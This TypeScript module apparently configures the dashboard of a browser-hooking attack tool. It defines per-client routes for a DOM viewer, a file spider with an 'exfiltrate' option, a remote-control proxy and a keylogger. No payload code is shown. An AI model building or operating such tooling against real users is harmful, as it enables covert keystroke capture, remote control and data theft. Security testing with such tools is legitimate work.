import { Eye, Bug, Gamepad2, Keyboard, BookOpen } from "lucide-react";
import type { LucideIcon } from "lucide-react";
import type { SpiderConfig } from "@/types/api";

export const AVAILABLE_PAYLOADS = ["domviewer", "spider", "proxy", "keylogger"] as const;
export type PayloadName = (typeof AVAILABLE_PAYLOADS)[number];

export const PAYLOAD_LABELS: Record<string, string> = {
  domviewer: "Viewer",
  spider: "Spider",
  proxy: "Remote Control",
  keylogger: "Keylogger",
};

export function getPayloadLabel(name: string): string {
  return PAYLOAD_LABELS[name] ?? name;
}

export interface ToolDef {
  key: string;
  icon: LucideIcon;
  title: string;
  pathPrefix: string;
  route: (clientId: string) => string;
  /** Payload-gated tools are dimmed when the payload isn't active */
  isPayload: boolean;
}

export const TOOLS: ToolDef[] = [
  {
    key: "domviewer",
    icon: Eye,
    title: "Viewer",
    pathPrefix: "/view/",
    route: (id) => `/view/${id}`,
    isPayload: true,
  },
  {
    key: "spider",
    icon: Bug,
    title: "Spider",
    pathPrefix: "/spider/",
    route: (id) => `/spider/${id}`,
    isPayload: true,
  },
  {
    key: "proxy",
    icon: Gamepad2,
    title: "Remote Control",
    pathPrefix: "/proxy/",
    route: (id) => `/proxy/${id}`,
    isPayload: true,
  },
  {
    key: "keylogger",
    icon: Keyboard,
    title: "Keylogger",
    pathPrefix: "/keylogger/",
    route: (id) => `/keylogger/${id}`,
    isPayload: true,
  },
  {
    key: "logs",
    icon: BookOpen,
    title: "Logs",
    pathPrefix: "/logs/",
    route: (id) => `/logs/${id}`,
    isPayload: false,
  },
];

/**
 * Default spider payload config. `maxFileSize` is stored in bytes.
 * Used as the baseline when editing per-client config and when creating new links.
 */
export const DEFAULT_SPIDER_CONFIG: SpiderConfig = {
  exfiltrate: false,
  limitTypes: true,
  maxFileSize: 10 * 1024 * 1024,
};
